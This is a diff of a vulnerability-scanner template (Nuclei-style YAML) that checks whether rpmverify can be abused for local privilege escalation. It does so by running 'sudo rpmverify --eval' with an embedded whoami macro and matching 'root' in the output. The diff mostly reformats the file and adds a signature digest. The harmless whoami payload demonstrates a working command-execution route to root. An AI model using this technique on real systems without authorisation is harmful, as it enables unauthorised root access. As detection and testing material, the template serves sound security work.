@@ -1,5 +1,4 @@
 id: privesc-rpmverify
-
 info:
   name: rpmverify - Privilege Escalation
   author: daffainfo
@@ -9,30 +8,25 @@ info:
   reference:
     - https://gtfobins.github.io/gtfobins/rpmverify/
   metadata:
-    verified: true
     max-request: 3
-  tags: code,linux,rpmverify,privesc,local
-
-self-contained: true
+    verified: true
+  tags: code,linux,local,privesc,rpmverify
 code:
   - engine:
       - sh
       - bash
     source: |
       whoami
-
   - engine:
       - sh
       - bash
     source: |
       rpmverify --eval '%(whoami 1>&2)'
-
   - engine:
       - sh
       - bash
     source: |
       sudo rpmverify --eval '%(whoami 1>&2)'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -40,10 +34,10 @@ code:
         words:
           - "root"
         negative: true
-
       - type: dsl
         dsl:
           - 'contains(code_2_response, "root")'
           - 'contains(code_3_response, "root")'
         condition: or
-
+        # digest: 4b0a00483046022100a788526d96e52ff1cc3b258d770579cb7c114eae49babb2fac0c7651022a0463022100a1d63ea06bd3d9134854eeeba7417b3ee2af0150bccd9d351d69df47c6183075:922c64590222798bb761d5b6d8e72950
+self-contained: true
